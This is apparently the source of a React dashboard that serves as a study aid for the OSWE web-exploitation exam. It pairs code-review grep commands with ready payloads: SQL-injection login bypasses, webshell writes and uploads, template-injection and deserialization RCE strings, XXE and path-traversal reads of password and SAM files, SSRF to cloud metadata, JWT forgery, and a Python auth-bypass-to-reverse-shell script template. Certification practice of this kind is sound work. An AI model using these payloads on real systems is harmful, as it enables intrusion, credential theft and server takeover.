const{useState,useEffect,useRef}=window.React;

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// OSWE AUTOPILOT v2 — WEB-300 Decision Engine 2026
// 2 Machines (Auth Bypass -> RCE) | 47h45m + 24h report
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

// ─── PHASE 0: RECON & CODE REVIEW ───
const RECON_CHAIN=[
{phase:"0. Strategy & Core Recon",desc:"Map the app before reading code.",steps:[
{action:"Map App Workflow",cmd:(v)=>`# 1. Register a user (if possible)\n# 2. Login and proxy ALL traffic through Burp (${v.proxy||"127.0.0.1:8080"})\n# 3. Use EVERY feature — note parameters, uploads, API endpoints\n# 4. Target: ${v.target||"http://target.local"}\n\n# Goal: Understand WHAT the app does before HOW`,check:"All features mapped in Burp?",critical:true},
{action:"Identify Stack & Entry Points",cmd:(v)=>`# Languages: Java, C#, PHP, Node.js, Python, Ruby\n# Find routing: routes.php, MainController.java, app.js, urls.py\n# Database: MySQL, PostgreSQL, MSSQL, SQLite, MongoDB\n# Where do HTTP requests enter the code?`,check:"Stack + routing identified?"},
{action:"Trace Auth Middleware",cmd:(v)=>`# Java: Filter, Interceptor, @PreAuthorize\n# C#: [Authorize], IAuthorizationFilter, middleware\n# Node: app.use(authMiddleware), passport.authenticate()\n# PHP: $_SESSION checks, include('auth.php')\n# Python: @login_required, decorators\n\n# KEY: Find endpoints that SKIP auth!`,check:"Auth middleware found? Unprotected routes?",critical:true},
{action:"Map Database Schema",cmd:(v)=>`# Find DB config files:\ngrep -ri 'password' config/ .env web.config appsettings.json\n\n# Find schema/migrations:\nfind . -name '*.sql' -o -name '*migration*' -o -name '*schema*'\n\n# Identify user table structure, role columns, password hashing`,check:"DB creds found? Schema understood?"},
]},
{phase:"1. Source Code Review (Grep-Fu)",desc:"Quickly find dangerous functions and sinks.",steps:[
{action:"SQL Injection Sinks",cmd:(v)=>`# PHP:\ngrep -rn 'SELECT.*FROM' . --include='*.php'\ngrep -rn '\\$_GET\\|\\$_POST\\|\\$_REQUEST' . --include='*.php' | grep -i 'query\\|select\\|insert\\|update\\|delete'\n\n# Java:\ngrep -rn 'createStatement\\|prepareStatement.*+' . --include='*.java'\ngrep -rn 'SqlCommand.*+' . --include='*.cs'\n\n# Node.js:\ngrep -rn 'db.query.*+\\|connection.query.*+' . --include='*.js'\n\n# Python:\ngrep -rn 'cursor.execute.*%\\|cursor.execute.*format\\|cursor.execute.*f\"' . --include='*.py'`,check:"Concatenated SQL? (NOT parameterized)",critical:true},
{action:"RCE / Command Exec Sinks",cmd:(v)=>`# PHP:\ngrep -rnE '(system|exec|shell_exec|passthru|popen|proc_open)\\(' . --include='*.php'\n\n# Java:\ngrep -rn 'Runtime.getRuntime().exec\\|ProcessBuilder' . --include='*.java'\n\n# Node.js:\ngrep -rnE '(child_process|exec|spawn|execSync)' . --include='*.js'\n\n# Python:\ngrep -rnE '(os.system|os.popen|subprocess|eval|exec)' . --include='*.py'\n\n# C#:\ngrep -rn 'Process.Start' . --include='*.cs'`,check:"OS command execution sinks?"},
{action:"Deserialization Sinks",cmd:(v)=>`# PHP:\ngrep -rn 'unserialize' . --include='*.php'\n\n# Java:\ngrep -rn 'ObjectInputStream\\|readObject\\|XMLDecoder\\|fromXML' . --include='*.java'\n\n# .NET:\ngrep -rn 'BinaryFormatter\\|ObjectStateFormatter\\|SoapFormatter\\|NetDataContractSerializer\\|TypeNameHandling' . --include='*.cs'\ngrep -rn '__VIEWSTATE' . --include='*.aspx' --include='*.ascx'\n\n# Node.js:\ngrep -rn 'node-serialize\\|serialize\\|unserialize' . --include='*.js'\n\n# Python:\ngrep -rn 'pickle.loads\\|yaml.load\\|yaml.unsafe_load' . --include='*.py'`,check:"Deserialization found?",critical:true},
{action:"File Upload / Path Traversal",cmd:(v)=>`# PHP:\ngrep -rn 'move_uploaded_file\\|\\$_FILES' . --include='*.php'\n\n# Java:\ngrep -rn 'MultipartFile\\|getOriginalFilename' . --include='*.java'\n\n# General path traversal:\ngrep -rnE '(file_get_contents|include|require|fopen|readFile|createReadStream)' . | grep -v node_modules`,check:"Upload or file read sinks?"},
{action:"Template Injection / XSS Sinks",cmd:(v)=>`# Template engines:\ngrep -rn 'render_template_string\\|Environment\\|Jinja' . --include='*.py'\ngrep -rn 'Freemarker\\|Velocity\\|Thymeleaf' . --include='*.java'\ngrep -rn 'Twig\\|Smarty\\|Blade' . --include='*.php'\n\n# XSS (reflected user input):\ngrep -rn 'innerHTML\\|document.write\\|eval(' . --include='*.js'\ngrep -rn 'echo.*\\$_\\|print.*\\$_' . --include='*.php'\ngrep -rn 'Response.Write' . --include='*.cs'`,check:"Template engine or XSS sinks?"},
{action:"Prototype Pollution (Node.js)",cmd:(v)=>`grep -rn 'merge\\|extend\\|assign\\|defaultsDeep\\|_.set\\|lodash' . --include='*.js' | grep -v node_modules\ngrep -rn '__proto__\\|constructor.prototype' . --include='*.js'`,check:"Object merge without sanitization?"},
]},
];

// ─── AUTH BYPASS ───
const AUTH_CHAIN=[
{phase:"2. SQL Injection Auth Bypass",desc:"Bypass login via SQLi when inputs aren't parameterized.",steps:[
{action:"Identify Login Query",cmd:(v)=>`# Trace the login endpoint in code\n# Example vulnerable query:\n# SELECT * FROM users WHERE username = 'USER' AND password = 'PWD'`,check:"Login query uses concatenation?",critical:true},
{action:"Classic Auth Bypass",cmd:(v)=>`# Payloads to try:\nadmin' --\nadmin' #\nadmin'/*\n' or 1=1--\n' or 1=1#\nadmin' or '1'='1\n\n# URL encoded:\nadmin'%20--\nadmin'+OR+1%3d1--`,check:"Logged in as admin?"},
{action:"UNION Auth Bypass",cmd:(v)=>`# If password is hashed BEFORE query:\n# 1. Find column count: ORDER BY 1, ORDER BY 2...\n# 2. Inject fake user:\n# username = ' UNION SELECT 1,'admin','KNOWN_HASH','admin@mail.com' --\n# password = YOUR_KNOWN_PASSWORD\n\n# The app compares your password to your injected hash`,check:"Injected fake user via UNION?"},
{action:"Blind SQLi for Data Extraction",cmd:(v)=>`# Boolean-based:\n' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --\n\n# Time-based:\n' AND SLEEP(5) --             # MySQL\n' AND pg_sleep(5) --          # PostgreSQL\n'; WAITFOR DELAY '0:0:5' --   # MSSQL\n\n# Use sqlmap if allowed:\nsqlmap -u "${v.target||"http://target"}/login" --data="user=admin&pass=test" --level 3`,check:"Extracted admin password/hash?",critical:true},
]},
{phase:"3. Logic Flaws & Type Juggling",desc:"Exploit loose typing or broken logic in auth.",steps:[
{action:"PHP Magic Hashes",cmd:(v)=>`# If code uses == (not ===) for hash comparison\n# MD5("240610708") = 0e462097431906509019562988736854\n# MD5("QNKCDZO")   = 0e830400451993494058024219903391\n# Both == 0 in PHP loose comparison!`,check:"Code uses == on hashes?"},
{action:"Type Juggling (strcmp, JSON)",cmd:(v)=>`# strcmp() returns 0 if given an array:\n# Payload: username=admin&password[]=1\n\n# JSON type juggling:\n# {"username":"admin", "password": 0}\n# In PHP: "secret" == 0 evaluates to TRUE!\n\n# true == "anything" is TRUE\n# 0 == "string" is TRUE`,check:"Can pass array/int to string check?"},
{action:"Mass Assignment",cmd:(v)=>`# Can you add arbitrary fields?\n# POST /profile/update\n# {"email":"me@me.com", "role":"admin", "is_admin":true}\n\n# Node.js Sequelize:\n# User.update(req.body)  <-- dangerous if not filtered\n\n# Ruby on Rails:\n# params.permit! allows all fields`,check:"Can force admin role?"},
{action:"IDOR / Broken Authorization",cmd:(v)=>`# Change numeric IDs in URLs:\n# /api/user/1  ->  /api/user/2\n# /profile?id=100  ->  /profile?id=1\n\n# Check if authorization is checked AFTER authentication\n# Many apps check "is logged in?" but NOT "is this YOUR data?"`,check:"Can access other users' data?"},
]},
{phase:"4. Session & Token Abuse",desc:"JWT flaws, predictable session IDs, CSRF.",steps:[
{action:"JWT Weak Secret",cmd:(v)=>`# Crack JWT:\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\n# If cracked, forge token with "role":"admin":\n# Use jwt.io or pyjwt:\nimport jwt\ntoken = jwt.encode({"user":"admin","role":"admin"}, "cracked_secret", algorithm="HS256")`,check:"JWT cracked?",critical:true},
{action:"JWT None Algorithm",cmd:(v)=>`# Change header to {"alg":"none","typ":"JWT"}\n# Remove signature portion\n# Some libraries accept alg=none!`,check:"App accepts alg=none?"},
{action:"Predictable Session / Tokens",cmd:(v)=>`# Is session ID = MD5(username)? Base64(user:role)?\n# Is reset token = MD5(email+timestamp)?\n# Is CSRF token predictable or reusable?`,check:"Can forge session/reset token?"},
{action:"CSRF + XSS Chain for Admin",cmd:(v)=>`# If you found XSS, chain with CSRF:\n# 1. Find admin action (create user, change password)\n# 2. Craft CSRF payload:\n# <img src="${v.target||"http://target"}/admin/adduser?user=hacker&pass=hacker&role=admin">\n# 3. Inject via XSS to execute as admin\n\n# Persistent XSS -> Admin visits page -> CSRF fires -> You get admin`,check:"XSS + CSRF = admin access?"},
]},
];

// ─── RCE ───
const RCE_CHAIN=[
{phase:"5. SQLi to RCE",desc:"Escalate SQL injection to command execution.",steps:[
{action:"PostgreSQL: COPY TO PROGRAM",cmd:(v)=>`DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'whoami';\nSELECT * FROM cmd_exec;`,check:"PostgreSQL superuser?",critical:true},
{action:"PostgreSQL: Large Objects (UDF)",cmd:(v)=>`# 1. Upload .so/.dll via large objects:\nSELECT lo_import('/path/to/rev.so', 1337);\nSELECT lo_export(1337, '/tmp/rev.so');\n\n# 2. Create function:\nCREATE OR REPLACE FUNCTION sys(cstring) RETURNS int\n  AS '/tmp/rev.so', 'sys' LANGUAGE 'c' STRICT;\nSELECT sys('whoami');`,check:"Can upload + execute custom UDF?"},
{action:"MySQL: INTO OUTFILE",cmd:(v)=>`# Write webshell:\nSELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/cmd.php';\n\n# Then: curl "${v.target||"http://target"}/cmd.php?cmd=whoami"`,check:"MySQL FILE priv? Know web root?"},
{action:"MSSQL: xp_cmdshell",cmd:(v)=>`EXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';`,check:"MSSQL sa user?"},
]},
{phase:"6. Server-Side Template Injection",desc:"Inject code into template engines for RCE.",steps:[
{action:"Identify Template Engine",cmd:(v)=>`# Test in ALL input fields:\n{{7*7}}     => 49 (Jinja2, Twig)\n\${7*7}     => 49 (Freemarker)\n<%= 7*7 %>  => 49 (ERB, EJS)\n#{7*7}      => 49 (Thymeleaf)\n{{7*'7'}}   => 7777777 (Jinja2 confirms)`,check:"Template evaluated math?",critical:true},
{action:"Jinja2 (Python) RCE",cmd:(v)=>`# Method 1 (config):\n{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}\n\n# Method 2 (subclasses):\n{{''.__class__.__mro__[1].__subclasses__()[408]('whoami',shell=True,stdout=-1).communicate()[0]}}`,check:"Python command executed?"},
{action:"Freemarker (Java) RCE",cmd:(v)=>`<#assign ex="freemarker.template.utility.Execute"?new()>\n\${ ex("whoami") }`,check:"Java command executed?"},
{action:"Twig (PHP) RCE",cmd:(v)=>`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}`,check:"PHP command executed?"},
{action:"ERB (Ruby) RCE",cmd:(v)=>`<%= system("whoami") %>\n<%= \`whoami\` %>`,check:"Ruby command executed?"},
]},
{phase:"7. Insecure Deserialization",desc:"Exploit serialized objects for RCE.",steps:[
{action:"Java Deserialization",cmd:(v)=>`# Generate payload:\njava -jar ysoserial.jar CommonsCollections1 "ping ${v.lhost||"LHOST"}" > payload.bin\nbase64 payload.bin > payload.b64\n\n# Common gadget chains:\n# CommonsCollections1-7, Spring1-2, Groovy1\n# Try each until one works`,check:"Java serialized data found?",critical:true},
{action:".NET Deserialization / ViewState",cmd:(v)=>`# ysoserial.net:\nysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "ping ${v.lhost||"LHOST"}" -o base64\n\n# ViewState (if MAC validation disabled):\n# Decode __VIEWSTATE, inject gadget chain\n# Check web.config for: enableViewStateMac="false"`,check:".NET serialized data or ViewState?"},
{action:"PHP Object Injection",cmd:(v)=>`# Find: unserialize($_GET['data'])\n# Look for magic methods: __wakeup(), __destruct(), __toString()\n# Chain: POP gadgets through class autoloading\n\n# Test: O:8:"stdClass":0:{}\n# Craft: serialize object with dangerous properties`,check:"PHP unserialize() or Phar?"},
{action:"Python Pickle / YAML",cmd:(v)=>`# Pickle RCE:\nimport pickle, os, base64\nclass Exploit:\n  def __reduce__(self):\n    return (os.system, ('whoami',))\nprint(base64.b64encode(pickle.dumps(Exploit())))\n\n# YAML unsafe_load:\n!!python/object/apply:os.system ['whoami']`,check:"Python deserialization?"},
{action:"Node.js Deserialization",cmd:(v)=>`# node-serialize IIFE:\n{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}\n\n# Prototype pollution -> RCE:\n{"__proto__":{"env":{"NODE_DEBUG":"require('child_process').exec('whoami')"}}}`,check:"Node.js serialize/prototype chain?"},
]},
{phase:"8. File Upload to RCE",desc:"Bypass upload filters to get code execution.",steps:[
{action:"Extension Bypass",cmd:(v)=>`# PHP: .php5, .phtml, .phar, .phps, .pHP, .php.jpg\n# ASP: .asp, .aspx, .ashx, .asmx, .cer\n# JSP: .jsp, .jspx, .jsw, .jsv\n\n# Double extension: shell.php.jpg\n# Null byte: shell.php%00.jpg (old PHP)\n# Case: shell.pHp`,check:"Extension filter bypassed?",critical:true},
{action:"Content-Type & Magic Bytes",cmd:(v)=>`# Change Content-Type header to: image/jpeg\n# Prepend magic bytes: GIF89a<?php system($_GET['cmd']); ?>\n\n# PNG magic: \\x89PNG + PHP code\n# Or use exiftool to embed in EXIF:\nexiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg`,check:"Server checks Content-Type or magic?"},
{action:".htaccess Upload",cmd:(v)=>`# If you can upload .htaccess:\nAddType application/x-httpd-php .jpg\n\n# Then upload shell.jpg with PHP code\n# Access: ${v.target||"http://target"}/uploads/shell.jpg?cmd=whoami`,check:"Can upload .htaccess?"},
]},
{phase:"9. SSRF & XXE",desc:"Server-Side Request Forgery and XML External Entities.",steps:[
{action:"XXE File Read",cmd:(v)=>`<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY file SYSTEM "file:///etc/passwd">\n]>\n<data>&file;</data>\n\n# PHP wrapper (base64 source):\n<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">`,check:"File contents returned?",critical:true},
{action:"SSRF to Internal Services",cmd:(v)=>`# Test internal access:\n${v.target||"http://target"}/fetch?url=http://127.0.0.1:80\n${v.target||"http://target"}/fetch?url=http://127.0.0.1:8080\n${v.target||"http://target"}/fetch?url=http://127.0.0.1:3306\n\n# Cloud metadata:\nhttp://169.254.169.254/latest/meta-data/`,check:"Internal services accessible?"},
{action:"SSRF to RCE",cmd:(v)=>`# Redis via Gopher:\ngopher://127.0.0.1:6379/_SET%20shell%20'<?php system($_GET["cmd"]); ?>'\n\n# Internal API abuse:\nhttp://127.0.0.1:8080/admin/exec?cmd=whoami`,check:"Chain to RCE?"},
]},
{phase:"10. Prototype Pollution (Node.js)",desc:"Pollute Object.prototype for RCE or auth bypass.",steps:[
{action:"Identify Merge/Extend",cmd:(v)=>`# Dangerous patterns:\nObject.assign(target, userInput)\n_.merge(target, userInput)\n_.defaultsDeep(target, userInput)\n\n# Test payload:\n{"__proto__":{"isAdmin":true}}`,check:"Object merge with user input?",critical:true},
{action:"Auth Bypass via Pollution",cmd:(v)=>`# If app checks: if(user.isAdmin)\n# Pollute: {"__proto__":{"isAdmin":true}}\n# Now ALL objects inherit isAdmin=true\n\n# Or role-based: {"__proto__":{"role":"admin"}}`,check:"Auth bypassed via prototype?"},
{action:"RCE via Pollution",cmd:(v)=>`# child_process.spawn env pollution:\n{"__proto__":{"env":{"NODE_DEBUG":"require('child_process').exec('whoami')"}}}\n\n# Or constructor pollution:\n{"constructor":{"prototype":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}}`,check:"RCE achieved?"},
]},
];

// ─── PATH TRAVERSAL & RACE CONDITIONS ───
const EXTRA_CHAIN=[
{phase:"11. Path Traversal / LFI",desc:"Read source code and sensitive files via path traversal.",steps:[
{action:"Basic path traversal",cmd:(v)=>`GET /download?file=../../../../etc/passwd\nGET /include?page=../../../../../../etc/shadow\n\n# Windows:\nGET /download?file=..\\..\\..\\..\\windows\\win.ini\nGET /download?file=..\\..\\..\\..\\windows\\system32\\config\\SAM\n\n# Null byte (older PHP):\nGET /page?file=../../etc/passwd%00`,check:"File contents returned?",critical:true},
{action:"Read application source",cmd:(v)=>`# Read config files with DB creds:\nGET /download?file=../../../app/config/database.yml\nGET /download?file=../../../WEB-INF/web.xml\nGET /download?file=../../../.env\nGET /download?file=../../../config.php\nGET /download?file=../../../settings.py\n\n# Bypass filters:\n....//....//....//etc/passwd\n..%252f..%252f..%252fetc/passwd\n..%c0%afetc%c0%afpasswd`,check:"Source code / creds found?",critical:true},
]},
{phase:"12. Race Conditions (TOCTOU)",desc:"Exploit time-of-check to time-of-use race conditions.",steps:[
{action:"Identify race window",cmd:(v)=>`# Look for patterns:\n# 1. Check permission -> perform action (gap exploitable)\n# 2. Coupon/discount applied once -> race for multiple use\n# 3. File upload -> validation -> move (overwrite during validation)\n\n# Turbo Intruder (Burp):\n# Use "race.py" template:\n# engine.queue(target.req, gate='race1')\n# engine.openGate('race1')`,check:"TOCTOU gap identified?",critical:true},
{action:"Python race exploit",cmd:(v)=>`import requests, threading\n\ndef race_request():\n    s = requests.Session()\n    # Perform the action that should only happen once:\n    res = s.post("${v.target||"http://target"}/redeem",\n           data={"coupon":"DISCOUNT50"},\n           proxies={'http':'http://${v.proxy||"127.0.0.1:8080"}'})\n    print(f"[Thread {threading.current_thread().name}] {res.status_code}")\n\nthreads = [threading.Thread(target=race_request) for _ in range(20)]\nfor t in threads: t.start()\nfor t in threads: t.join()`,check:"Multiple successful actions?"},
]},
{phase:"13. Padding Oracle",desc:"Decrypt and forge cookies/tokens via CBC padding oracle.",steps:[
{action:"Detect oracle",cmd:(v)=>`# Modify last byte of encrypted cookie\n# If different error for valid vs invalid padding:\n# -> Padding Oracle exists!\n\n# padbuster:\npadbuster "${v.target||"http://target"}/login" ENCRYPTED_COOKIE 8\n  -cookies "auth=ENCRYPTED_COOKIE"\n  -encoding 0\n\n# 8 = block size (AES-128-CBC = 16, DES = 8)`,check:"Different errors for padding? Oracle confirmed?",critical:true},
{action:"Decrypt and forge",cmd:(v)=>`# Decrypt existing cookie:\npadbuster "${v.target||"http://target"}/profile" ENCRYPTED_COOKIE 16\n  -cookies "session=ENCRYPTED_COOKIE"\n  -encoding 0\n\n# Forge admin cookie:\npadbuster "${v.target||"http://target"}/profile" ENCRYPTED_COOKIE 16\n  -cookies "session=ENCRYPTED_COOKIE"\n  -encoding 0\n  -plaintext "user=admin;role=admin"`,check:"Can decrypt/forge tokens?",critical:true},
]},
];

// ─── EXPLOIT SCRIPTING ───
const SCRIPT_CHAIN=[
{phase:"11. Python Exploit Automation",desc:"OSWE requires a single script: Auth Bypass -> RCE.",steps:[
{action:"Session + Auth Bypass",cmd:(v)=>`import requests, re, sys\n\ns = requests.Session()\nproxies = {'http':'http://${v.proxy||"127.0.0.1:8080"}'}\ntarget = "${v.target||"http://target.local"}"\n\n# Step 1: Auth Bypass\nlogin_data = {"user": "admin' --", "pass": "any"}\nres = s.post(f"{target}/login", data=login_data, proxies=proxies)\nprint("[+] Logged in:", s.cookies.get_dict())`,check:"Programmatic login works?",critical:true},
{action:"CSRF Token Extraction",cmd:(v)=>`# Extract CSRF token:\nres = s.get(f"{target}/admin", proxies=proxies)\nmatch = re.search(r'name="csrf_token" value="(.*?)"', res.text)\nif match:\n    token = match.group(1)\n    print("[+] CSRF Token:", token)\nelse:\n    print("[-] Token not found"); sys.exit(1)`,check:"Token extracted?"},
{action:"RCE Trigger",cmd:(v)=>`# Example: SQLi to RCE (PostgreSQL COPY)\nsqli_payload = "'; COPY cmd_exec FROM PROGRAM 'whoami'; --"\nres = s.post(f"{target}/search", data={"q": sqli_payload}, proxies=proxies)\nprint("[+] RCE output:", res.text)\n\n# Or: File upload webshell\nfiles = {'file': ('cmd.php', '<?php system($_GET["c"]); ?>', 'application/x-php')}\nres = s.post(f"{target}/upload", files=files, proxies=proxies)`,check:"RCE working in script?"},
{action:"Background Thread (Shell)",cmd:(v)=>`import threading\n\ndef trigger():\n    print("[*] Triggering reverse shell...")\n    s.get(f"{target}/uploads/cmd.php?c=PAYLOAD", proxies=proxies, timeout=5)\n\nt = threading.Thread(target=trigger)\nt.start()\nprint("[+] Check your listener!")`,check:"End-to-end chain works?",critical:true},
{action:"Full Script Template",cmd:(v)=>`#!/usr/bin/env python3\n\"\"\"OSWE Exploit - Machine X\nUsage: python3 exploit.py <TARGET_URL> <LHOST> <LPORT>\"\"\"\nimport requests, re, sys, threading\n\ndef main():\n    if len(sys.argv) != 4:\n        print(f"Usage: {sys.argv[0]} <URL> <LHOST> <LPORT>")\n        sys.exit(1)\n    target, lhost, lport = sys.argv[1], sys.argv[2], sys.argv[3]\n    s = requests.Session()\n    proxies = {'http':'http://${v.proxy||"127.0.0.1:8080"}'}\n\n    # STEP 1: Auth Bypass\n    print("[*] Step 1: Authentication Bypass")\n    # ... your auth bypass code ...\n\n    # STEP 2: RCE\n    print("[*] Step 2: Remote Code Execution")\n    # ... your RCE code ...\n\n    print("[+] Exploit complete!")\n\nif __name__ == "__main__":\n    main()`,check:"Script template ready?"},
]},
];

// ─── CHECKLIST ───
const CHECKLIST={
"Machine 1 (50 Points)":[
"Mapped application routing and structure","Identified language stack and database",
"Source code review: found Auth Bypass vuln","Successfully bypassed authentication",
"Auth Bypass proof.txt captured + screenshot","Identified RCE vulnerability class",
"Successfully achieved Remote Code Execution","RCE proof.txt captured + screenshot",
"Python exploit script chains both bugs","Script is NON-INTERACTIVE (argparse/sys.argv)",
"Script tested on clean machine",
],
"Machine 2 (50 Points)":[
"Mapped application routing and structure","Identified language stack and database",
"Source code review: found Auth Bypass vuln","Successfully bypassed authentication",
"Auth Bypass proof.txt captured + screenshot","Identified RCE vulnerability class",
"Successfully achieved Remote Code Execution","RCE proof.txt captured + screenshot",
"Python exploit script chains both bugs","Script is NON-INTERACTIVE",
"Script tested on clean machine",
],
"Report Document":[
"Detailed steps replicating exploitation","Relevant source code snippets with line numbers",
"Screenshots of proof.txt for ALL flags","Full Python exploit code included",
"Report explains vulnerability root cause","Report in PDF format",
"Uploaded within 24h window",
],
};

// ─── MILESTONES ───
const MILESTONES=[
{hour:0,label:"START — VPN, Burp, browse app, proxy all traffic."},
{hour:2,label:"M1: Recon done. Auth mechanism mapped. Start code review."},
{hour:6,label:"M1: Auth Bypass found + exploited. Capture flag."},
{hour:12,label:"M1: RCE identified and tested. Start Python exploit."},
{hour:16,label:"M1 DONE. 50pts secured. Take a break / sleep."},
{hour:20,label:"M2: Recon & code review underway."},
{hour:26,label:"M2: Auth Bypass found. Capture flag."},
{hour:32,label:"M2: RCE identified. Start Python exploit."},
{hour:38,label:"M2 DONE. 100pts. Finalize both exploit scripts."},
{hour:44,label:"FINAL — Test scripts on clean machines. Organize screenshots."},
{hour:47.75,label:"EXAM ENDS — Begin 24-hour report."},
];

// ─── QUICK REF ───
const QUICK_REF={
"Grep: PHP Sinks":[
{l:"SQLi",c:"grep -rn 'SELECT.*FROM' . --include='*.php'"},{l:"Exec",c:"grep -rnE '(system|exec|shell_exec|passthru)\\(' . --include='*.php'"},
{l:"Upload",c:"grep -rn 'move_uploaded_file' . --include='*.php'"},{l:"Unserialize",c:"grep -rn 'unserialize' . --include='*.php'"},
{l:"Include/Require",c:"grep -rnE '(include|require)(_once)?\\(' . --include='*.php'"},{l:"Type compare",c:"grep -rn '==' . --include='*.php' | grep -v '==='"},
],
"Grep: Java Sinks":[
{l:"SQLi",c:"grep -rn 'createStatement\\|Statement.*+' . --include='*.java'"},{l:"Exec",c:"grep -rn 'Runtime.getRuntime().exec\\|ProcessBuilder' . --include='*.java'"},
{l:"Deserialize",c:"grep -rn 'ObjectInputStream\\|readObject' . --include='*.java'"},{l:"SSTI",c:"grep -rn 'Freemarker\\|Velocity\\|Thymeleaf' . --include='*.java'"},
{l:"SSRF",c:"grep -rn 'URL\\|HttpURLConnection\\|RestTemplate' . --include='*.java'"},
],
"Grep: Node.js Sinks":[
{l:"SQLi",c:"grep -rn 'db.query.*+\\|connection.query' . --include='*.js' | grep -v node_modules"},{l:"Exec",c:"grep -rn 'child_process\\|exec\\|spawn' . --include='*.js' | grep -v node_modules"},
{l:"Deserialize",c:"grep -rn 'serialize\\|unserialize' . --include='*.js' | grep -v node_modules"},{l:"Prototype",c:"grep -rn 'merge\\|extend\\|assign\\|defaultsDeep' . --include='*.js' | grep -v node_modules"},
{l:"eval",c:"grep -rn 'eval(' . --include='*.js' | grep -v node_modules"},
],
"Grep: C# Sinks":[
{l:"SQLi",c:"grep -rn 'SqlCommand.*+\\|CommandText.*+' . --include='*.cs'"},{l:"Exec",c:"grep -rn 'Process.Start' . --include='*.cs'"},
{l:"Deserialize",c:"grep -rn 'BinaryFormatter\\|TypeNameHandling\\|ObjectStateFormatter' . --include='*.cs'"},{l:"ViewState",c:"grep -rn '__VIEWSTATE\\|enableViewStateMac' . --include='*.cs' --include='*.aspx' --include='*.config'"},
],
"Grep: Python Sinks":[
{l:"SQLi",c:"grep -rn 'cursor.execute.*%\\|execute.*format\\|execute.*f\"' . --include='*.py'"},{l:"Exec",c:"grep -rnE '(os.system|subprocess|eval|exec)' . --include='*.py'"},
{l:"Pickle",c:"grep -rn 'pickle.loads\\|yaml.load' . --include='*.py'"},{l:"SSTI",c:"grep -rn 'render_template_string\\|Markup\\|Jinja' . --include='*.py'"},
],
"Payload Generators":[
{l:"ysoserial (Java)",c:'java -jar ysoserial.jar CommonsCollections1 "[CMD]" > out.bin'},{l:"ysoserial.net",c:'ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "[CMD]" -o base64'},
{l:"Hashcat JWT",c:"hashcat -m 16500 jwt.txt rockyou.txt"},{l:"Python Pickle",c:"python3 -c \"import pickle,os,base64;exec('class E:\\n def __reduce__(self):\\n  return(os.system,(\\\"whoami\\\",))');print(base64.b64encode(pickle.dumps(E())))\""},
],
"Python Scripting":[
{l:"Session",c:"s = requests.Session()"},{l:"Proxy",c:"proxies = {'http':'http://127.0.0.1:8080'}"},
{l:"POST JSON",c:"s.post(url, json={'user':'admin'}, proxies=proxies)"},{l:"Regex extract",c:"re.search(r'token=\"(.*?)\"', res.text).group(1)"},
{l:"File upload",c:"s.post(url, files={'f':('s.php','<?php system($_GET[\"c\"]); ?>','application/x-php')})"},{l:"URL encode",c:"import urllib.parse; urllib.parse.quote(\"admin' --\")"},
],
};

// ━━━ CSS ━━━
const CSS=`
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&display=swap');
:root{--b0:#06080b;--b1:#0b0e13;--b2:#111519;--b3:#191e26;--b4:#222831;--bd:#272e38;--bd2:#333c4a;--t0:#f3f5f7;--t1:#b3bcc8;--t2:#6c7585;--ac:#f97316;--acd:rgba(249,115,22,0.1);--g:#22c55e;--gd:rgba(34,197,94,0.08);--r:#ef4444;--rd:rgba(239,68,68,0.08);--y:#eab308;--b:#3b82f6;--cg:#6ee7b7;--m:'IBM Plex Mono',monospace;--s:'Outfit',system-ui,sans-serif}
*{margin:0;padding:0;box-sizing:border-box}body{background:var(--b0);color:var(--t1);font-family:var(--s)}
.app{min-height:100vh;display:flex;flex-direction:column}
.hdr{background:var(--b1);border-bottom:1px solid var(--bd);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
.logo{font-family:var(--s);font-weight:900;font-size:18px;letter-spacing:-0.5px;background:linear-gradient(135deg,#f97316,#fbbf24,#f43f5e);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo-sub{font-size:9px;color:var(--t2);letter-spacing:3px;text-transform:uppercase;font-weight:500}
.inps{display:flex;gap:4px;flex-wrap:wrap}
.inp{background:var(--b0);border:1px solid var(--bd);border-radius:4px;padding:5px 7px;color:var(--t0);font-size:10px;font-family:var(--m);outline:none;width:130px;transition:border .2s}
.inp:focus{border-color:var(--ac)}.inp::placeholder{color:var(--t2)}
.tabs{display:flex;background:var(--b1);border-bottom:1px solid var(--bd);overflow-x:auto;padding:0 8px;gap:1px}
.tab{padding:8px 12px;font-size:11px;font-weight:600;font-family:var(--s);color:var(--t2);background:none;border:none;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;transition:all .15s}
.tab:hover{color:var(--t1)}.tab.on{color:var(--ac);border-bottom-color:var(--ac);background:var(--b2)}
.main{flex:1;padding:14px 16px;max-width:1100px;margin:0 auto;width:100%}
.phase{background:var(--b2);border:1px solid var(--bd);border-radius:8px;margin-bottom:10px;overflow:hidden}
.phase-h{padding:10px 14px;cursor:pointer;display:flex;align-items:center;gap:10px;transition:background .1s}
.phase-h:hover{background:var(--b3)}
.phase-num{width:26px;height:26px;border-radius:6px;background:var(--acd);border:1px solid var(--ac);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:var(--ac);flex-shrink:0}
.phase-num.done{background:var(--g);border-color:var(--g);color:#fff}
